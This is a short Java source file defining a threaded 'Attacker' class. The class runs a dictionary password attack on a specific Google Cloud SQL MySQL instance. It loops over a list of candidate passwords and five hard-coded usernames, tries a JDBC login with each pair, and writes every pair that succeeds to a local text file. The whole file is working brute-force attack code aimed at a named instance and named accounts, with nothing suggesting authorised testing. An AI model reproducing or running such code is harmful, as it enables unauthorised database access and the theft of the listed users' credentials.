package ndbc;

import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;

public class Attacker extends Thread {
    ArrayList<String> store = new ArrayList<String>();
    String instanceConnectionName = "mineral-brand-148217:us-central1:first";
    String databaseName = "ndbc";
    String[] usernames = {"aborse","jbaumann", "jwilson","jyamauchi", "kbeine"};
    String jdbcUrl = String.format(
            "jdbc:mysql://google/%s?cloudSqlInstance=%s&"
                    + "socketFactory=com.google.cloud.sql.mysql.SocketFactory",
                    databaseName,
                    instanceConnectionName);
    
    public Attacker(ArrayList<String> newthing){
        store = newthing;
    }
    ///XXXX QUICK TRY - 
    ///   if a prediction is more than 17 seconds old - look at [1] and [2] instead of 2 and 1 
    public void run(){
        Connection connection = null;
        for (int i = 0; i < store.size(); i++){
            for (int j = 0; j < usernames.length; j++){
                try {
                	System.out.println("abholdridge");
                    connection = DriverManager.getConnection(jdbcUrl, usernames[j], store.get(i));
                    System.out.println(usernames[j]);
                    System.out.println(store.get(i));
                    try {
                        print(usernames[j], store.get(i));
                    } catch (FileNotFoundException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    } catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                } catch (SQLException e) {
                	System.out.println("Failed " + usernames[j] + " " + store.get(i));
                }
            }
        }
    }
    
    public synchronized void print(String uname, String pass) throws IOException{
        PrintWriter printed = new PrintWriter("/home/bholdridge/Documents/Dict/up2" + System.currentTimeMillis() + ".txt");
        printed.println(uname);
        printed.println(pass);
        printed.close();
    }
}